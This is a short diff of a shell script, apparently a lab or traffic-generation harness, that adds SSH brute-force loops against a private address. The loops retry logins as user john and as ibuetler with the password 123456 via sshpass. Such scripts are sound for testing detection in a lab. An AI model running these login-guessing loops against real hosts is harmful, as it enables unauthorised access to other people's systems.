@@ -10,7 +10,13 @@ sleep 1
 echo "launching ssh attack"
 client_ip=10.0.1.16
 for (( i=0; i<10; ++i)); do
+    echo "SSH-Bruteforcing $client_ip  with user john..."
     ssh -o "StrictHostKeyChecking no" john@$client_ip
+done
+
+for (( i=0; i<10; ++i)); do
+    echo "SSH-Bruteforcing $client_ip  with user ibuetler and password 123456..."
+    sshpass -p 123456 ssh -o "StrictHostKeyChecking no" ibuetler@$client_ip
 done
 
 
